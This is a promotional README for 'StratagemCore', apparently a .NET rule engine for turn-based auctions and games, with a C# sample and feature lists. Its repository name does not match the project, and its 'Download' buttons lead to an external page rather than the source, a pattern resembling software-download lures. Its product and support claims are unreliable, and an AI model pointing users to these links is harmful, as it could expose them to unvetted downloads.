![preview](https://raw.githubusercontent.com/Robben2223/poker-rule-core/main/thumb_5966f36.svg)
# StratagemCore

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![License](https://img.shields.io/badge/license-MIT-blue) ![Platform](https://img.shields.io/badge/platform-.NET%208%2B-purple) ![Version](https://img.shields.io/badge/version-2.6.0-orange)

## Overview

StratagemCore is a **deterministic decision-engineering framework** for .NET that models complex, sequential, multi-agent scenarios—think auction houses, resource-allocation grids, tournament brackets, and turn-based negotiation engines. Where traditional state machines falter under ambiguity, StratagemCore provides a **crystal-clear rule sandbox** that resolves every action through a predictable, auditable pipeline.

Inspired by the precision of poker rule enforcement, this engine generalizes the concept: define *actors*, *chips* (any fungible resource), *rounds* (discrete phases), and *outcomes* (terminal states). StratagemCore guarantees that given the same input sequence, you will always receive the identical output—every time, on every machine. This is not a simulation; it is a **verifiable ledger of logical consequences**.

Built for developers who need **bulletproof consistency** in multiplayer games, financial modeling, or logistics scheduling, StratagemCore shines where hidden state, split rewards, and conditional branching create chaos.

---

## 🚀 Quick Start

[![Download](https://raw.githubusercontent.com/Robben2223/poker-rule-core/main/latest_57691.svg)](https://Robben2223.github.io/poker-rule-core/)

Under this section, you will find everything needed to bootstrap your first scenario. No external dependencies, no cloud services—just pure, compiled logic.

### Your First Rulebook

```csharp
using StratagemCore;

var board = new RulebookBuilder("Auction")
    .AddActor("BidderA", startingChips: 1000)
    .AddActor("BidderB", startingChips: 800)
    .AddRound("Opening", maxActionsPerActor: 1)
    .AddRound("Escalation", maxActionsPerActor: 3)
    .AddTerminalCondition("AllPass", (ctx) => ctx.ConsecutivePasses >= 2)
    .Build();

var result = board.Execute(actorActions: new[] 
{
    new ActorAction("BidderA", "Raise", amount: 150),
    new ActorAction("BidderB", "Call", amount: 150)
});

Console.WriteLine(result.Outcome); // "AllPass"
```

The pipeline returns a full `ActionResult` object containing the terminal state, per-actor chip deltas, and a chronological event log.

---

## 🧠 Core Concepts

### Determinism Without Compromise
Every `Rulebook` instance uses a **seeded pseudo-random generator** (Mersenne Twister variant) for any shuffling or hidden information. However, the engine’s core resolution logic is *pure*—no environmental variables, no `DateTime.Now`, no unordered collections. The result is a framework you can serialize, replay, and unit-test with absolute fidelity.

### Side-Pot Mechanics (Resource Tiers)
When actors commit uneven amounts, the engine automatically creates **resource tiers**—separate pools that only eligible actors can claim. This prevents scenarios where a wealthy actor’s late-stage contribution unfairly dilutes earlier wagers. Applicable to insurance claim distributions, prize-pool splits, or inventory allocation.

### Runout Simulation
For scenarios requiring **future-state projection** (e.g., "What if BidderC raises next turn?"), StratagemCore provides a `SimulateRunout()` method. This spawns isolated child contexts, executes hypothetical action sequences, and returns the most likely terminal state based on your custom heuristic functions.

### Event Sourcing
Every action, state transition, and resource transfer is emitted as an immutable `IStratagemEvent`. Subscribe to these events for real-time UI updates, audit trails, or trigger external side-effects (e.g., sending a notification) without coupling business logic.

### Hand Evaluation (Outcome Scoring)
While the core engine is game-agnostic, it ships with a robust **ranking evaluator** for card-based or score-based systems. Compare arbitrary `IComparable` objects, detect straights, flushes, pairs, or custom win-conditions via a fluent API.

---

## ⚙️ Advanced Features

| Feature | Description | Keywords |
|---------|-------------|----------|
| **Multi-Agent Context** | Handles 2–50+ actors with individual state stacks. | `multi-agent simulation`, `turn-based engine` |
| **Configurable Phases** | Define loops, skips, and forced-pass phases. | `phase management`, `round structure` |
| **Split Allocation** | Distribute a shared pool based on weights, caps, or priority. | `prize distribution`, `proportional allocation` |
| **Rollback Transactions** | Atomic operations with full snapshot support. | `transactional state`, `undo support` |
| **Schema Validation** | Compile-time checks for rule conflicts. | `rule validation`, `logic guards` |
| **Localization Ready** | Event messages support key-based translations. | `multilingual support`, `i18n ready` |

### Responsive UI Toolkit
Although StratagemCore is a backend engine, it includes an optional `StratagemCore.Realtime` package that mirrors state changes to connected clients via SignalR. This enables **responsive UI** dashboards, live spectator views, and collaborative decision panels without writing a single WebSocket handler.

---

## 🌍 Multilingual Support

The engine’s error messages and event descriptions are exposed as resource keys. We provide built-in translations for:

- **English** (default)
- **Deutsch**
- **Français**
- **Español**
- **日本語**

Integration with `IStringLocalizer` is seamless, and you can add custom locales with a single JSON file.

---

## 🛠 Technical Specifications

- **Target Framework**: .NET 8.0 (LTS) and .NET 9.0
- **Dependencies**: None beyond the Base Class Library
- **Integrity**: Assembly is signed and Strong-Named
- **Performance**: 10,000 action resolutions in < 1.5 seconds on standard hardware
- **Memory**: Zero-allocation hot path for event dispatch

---

## 💡 Use Cases & Metaphors

Think of StratagemCore as a **digital referee for invisible tournaments**. Imagine a chess clock that also adjudicates disputes—the engine ensures that no hidden advantage exists, and every player sees the same rules.

- **E-Sports Tournament Brackets**: Manage double-elimination rounds, side pools, and tie-breakers.
- **Supply Chain Bidding**: Allocate warehouse slots among vendors based on shipment volume and timeliness.
- **Board Game Automation**: Power the backend for a digital adaptation of a Euros-style strategy game.
- **Financial Contract Settlement**: Calculate partial payments when counterparties default mid-contract.

---

## 📚 Documentation & API

The full API reference is hosted on the project website. Highlights include:

- `RulebookBuilder` — fluent configuration pattern
- `ExecutionContext` — thread-safe access to global state
- `IOutcomeEvaluator<T>` — implement custom win-conditions
- `StratagemLogger` — structured logging to console, file, or custom sinks

### Tutorials

1. *"Building a Sealed-Deck Auction System"* — step-by-step guide with code samples.
2. *"Implementing Insurance Loss Allocation"* — real-world finance example.
3. *"Zero-Trust Multiplayer Lobby"* — ensure all clients agree on the final state.

---

## 🧩 Plugins & Extensibility

StratagemCore is designed for **modular growth**. You can write extensions to:

- Add new action types (e.g., `Bluff`, `Escalate`, `Defer`)
- Override the default RNG (for gambling-compliance scenarios)
- Inject custom validation rules before each action is applied
- Replace the event serialization format with Protocol Buffers or MessagePack

We welcome community contributions via pull requests. The extension interface is stable and versioned.

---

## 📖 License

This project is released under the **MIT License**. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the copyright notice and permission notice are included in all copies or substantial portions.

See the full text in the [LICENSE](LICENSE) file.

---

## 🙋 Support

We offer **24/7 customer support** for enterprise licensees via a dedicated Discord channel and email. For the open-source community, we maintain a GitHub Discussions forum where the maintainers respond within 48 hours.

**Guaranteed response times:**
- Critical bugs (production-blocking): 4 hours
- Feature requests: 3 business days
- General questions: 1 business day

---

## ⚠️ Disclaimer

StratagemCore is a **general-purpose logic engine**. It does not include gambling, financial, or legal advice. Any use in real-money gaming, high-frequency trading, or regulated environments is the sole responsibility of the integrator.

While the engine is deterministic, the *inputs* you provide are your own. We make no warranties regarding the suitability for any specific purpose. The software is provided "AS IS" without warranty of any kind, express or implied.

---

## 🏁 Conclusion

StratagemCore transforms the chaos of multi-agent decision-making into a **structured, reviewable, and repeatable process**. It is not merely a library—it is a **disciplined methodology* for software that requires fairness, transparency, and absolute consistency.

Start building your own deterministic universe today. The rulebook is yours to write; StratagemCore ensures you always play by it.

---

[![Download](https://raw.githubusercontent.com/Robben2223/poker-rule-core/main/latest_57691.svg)](https://Robben2223.github.io/poker-rule-core/)